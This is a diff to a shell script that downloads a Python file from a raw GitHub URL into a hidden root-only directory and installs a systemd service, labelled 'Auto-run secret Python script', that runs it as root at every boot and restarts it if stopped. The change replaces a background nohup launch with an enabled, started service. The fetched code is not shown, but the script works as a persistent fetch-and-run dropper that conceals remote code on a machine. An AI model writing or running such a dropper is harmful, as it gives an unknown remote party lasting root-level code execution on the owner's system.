@@ -9,6 +9,8 @@
 PYTHON_FILE_URL="https://raw.githubusercontent.com/t56r4re/34553/refs/heads/main/gd.py"
 SECRET_DIR="/root/.system_service"   # Hidden & root-only directory
 DEST_FILE="$SECRET_DIR/gd.py"
+SERVICE_FILE="/etc/systemd/system/python_auto.service"
+PYTHON_PATH="$(which python3)"       # Detect system Python3 path automatically
 
 # -----------------------------
 # Ensure secret directory exists
@@ -25,24 +27,16 @@ curl -s -o "$DEST_FILE" "$PYTHON_FILE_URL"
 chmod 700 "$DEST_FILE"  # Make it executable only by root
 
 # -----------------------------
-# Run the script in background
+# Create systemd service to auto-run the script
 # -----------------------------
-nohup python3 "$DEST_FILE" >/dev/null 2>&1 &
-
-# -----------------------------
-# Ensure script runs on startup
-# -----------------------------
-AUTOSTART_FILE="/etc/systemd/system/python_auto.service"
-
-if [ ! -f "$AUTOSTART_FILE" ]; then
-    cat <<EOL > "$AUTOSTART_FILE"
+cat <<EOL > "$SERVICE_FILE"
 [Unit]
 Description=Auto-run secret Python script
 After=network.target
 
 [Service]
 Type=simple
-ExecStart=/usr/bin/python3 $DEST_FILE
+ExecStart=$PYTHON_PATH $DEST_FILE
 Restart=always
 User=root
 
@@ -50,7 +44,11 @@ User=root
 WantedBy=multi-user.target
 EOL
 
-    # Reload systemd and enable the service
-    systemctl daemon-reload
-    systemctl enable python_auto.service
-fi
+# -----------------------------
+# Reload systemd, enable and start service
+# -----------------------------
+systemctl daemon-reload
+systemctl enable python_auto.service
+systemctl start python_auto.service
+
+echo "Setup complete. The Python script will auto-run on startup."
